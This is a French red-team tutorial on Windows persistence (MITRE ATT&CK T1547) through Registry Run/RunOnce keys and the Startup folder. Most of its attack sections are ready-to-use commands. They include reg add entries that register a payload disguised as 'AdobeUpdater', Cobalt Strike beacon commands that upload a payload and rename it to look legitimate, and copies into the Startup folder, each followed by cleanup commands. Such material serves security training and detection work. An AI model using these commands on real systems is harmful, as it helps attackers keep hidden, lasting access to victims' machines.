L'exécution automatique au démarrage ou à l'ouverture de session est une famille de techniques, référencée par **MITRE ATT&CK** sous l'identifiant [**T1547**](https://attack.mitre.org/techniques/T1547/ "null"), où un attaquant configure le système pour exécuter automatiquement une charge utile (payload) lors du démarrage de la machine ou de la connexion d'un utilisateur.

## Technique 1 : Clés de Registre "Run" / "RunOnce"

### Principe

La base de registre Windows contient de nombreuses clés qui permettent à des programmes de se lancer automatiquement à l'ouverture de session. Elles sont utilisées de manière légitime par Windows et des applications tierces. Un attaquant peut simplement y ajouter une entrée pour établir sa persistance.

Les clés les plus communes sont :

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`: Pour l'utilisateur courant. L'entrée est **persistante** et s'exécute à chaque connexion.
    
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`: Pour l'utilisateur courant. L'entrée est **supprimée après sa première exécution**.
    
- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`: Pour tous les utilisateurs. L'entrée est persistante et nécessite des **privilèges élevés** pour être modifiée.
    

### Implémentation 

L'exemple ci-dessous utilise des commandes natives de Windows (`reg.exe`) qui peuvent être exécutées depuis `cmd.exe` ou `powershell.exe`.

```
# 1. Naviguer vers un répertoire où déposer le payload (ex: %TEMP%)
cd %TEMP%

# 2. Déposer le payload (ici, on simule en créant un fichier)
copy C:\chemin\vers\mon\payload.exe updater.exe

# 3. Ajouter la clé de registre pour l'utilisateur courant (HKCU)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "AdobeUpdater" /t REG_SZ /d "C:\Users\MonUser\AppData\Local\Temp\updater.exe" /f
```

**Exemple avec un C2 (type Cobalt Strike) :

```
// Se déplacer dans un répertoire discret
beacon> cd C:\Users\pchilds\AppData\Local\Microsoft\WindowsApps

// Téléverser le payload depuis la machine de l'attaquant
beacon> upload C:\Payloads\http_x64.exe

// Renommer le payload pour qu'il paraisse légitime
beacon> mv http_x64.exe updater.exe
​
// Créer la valeur dans la clé de registre Run. Le type REG_EXPAND_SZ permet d'utiliser des variables d'environnement.
beacon> reg_set HKCU Software\Microsoft\Windows\CurrentVersion\Run Updater REG_EXPAND_SZ %LOCALAPPDATA%\Microsoft\WindowsApps\updater.exe
```

### Vérification & Nettoyage

```
# Pour vérifier que la clé a bien été ajoutée
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "AdobeUpdater"

# Pour supprimer la persistance
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "AdobeUpdater" /f
```

## Technique 2 : Dossier de Démarrage (Startup Folder)

### Principe

Une méthode simple et ancienne consiste à placer un exécutable ou un raccourci (.LNK) dans le dossier "Démarrage" de l'utilisateur. Tout ce qui s'y trouve est exécuté à l'ouverture de la session.

- **Chemin pour l'utilisateur courant :** `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`
    
- **Chemin pour tous les utilisateurs (nécessite des privilèges élevés) :** `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup`
    

### Implémentation (Red Team)

```
# 1. Déposer le payload directement dans le dossier de démarrage
copy C:\chemin\vers\mon\payload.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\updater.exe"
```

**Exemple avec un C2 :**

```
// Se déplacer dans le dossier de démarrage de l'utilisateur
beacon> cd "C:\Users\pchilds\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

// Téléverser et renommer le payload
beacon> upload C:\Payloads\http_x64.exe
beacon> mv http_x64.exe updater.exe
```

### Nettoyage

```
# Supprimer simplement le fichier
del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\updater.exe"
```
